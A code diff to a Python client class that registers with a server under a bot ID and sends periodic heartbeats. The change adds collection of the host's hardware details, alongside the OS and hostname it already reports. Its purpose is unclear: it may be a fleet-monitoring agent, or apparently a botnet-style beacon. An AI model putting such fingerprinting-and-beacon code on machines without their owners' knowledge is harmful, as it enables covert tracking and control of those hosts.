@@ -6,6 +6,8 @@ import time
 
 import requests
 
+from modules import sysinfo
+
 
 class ServerClient:
     def __init__(self, server_url: str, modules: list):
@@ -21,6 +23,7 @@ class ServerClient:
             "os": f"{platform.system()} {platform.release()}",
             "user": platform.node(),
             "modules": self.modules,
+            "hardware": sysinfo.collect(),
         }
 
     def register(self):
@@ -41,7 +44,14 @@ class ServerClient:
                 time.sleep(3)
 
     def heartbeat(self):
-        r = requests.post(f"{self.server}/heartbeat/{self.bot_id}", timeout=10)
+        """Шлём пульс + свежее железо. Если сервер старое тело — оно просто
+        проигнорирует payload, last_seen всё равно обновится."""
+        payload = {"hardware": sysinfo.collect()}
+        r = requests.post(
+            f"{self.server}/heartbeat/{self.bot_id}",
+            json=payload,
+            timeout=10,
+        )
         r.raise_for_status()
         return r.json()
 
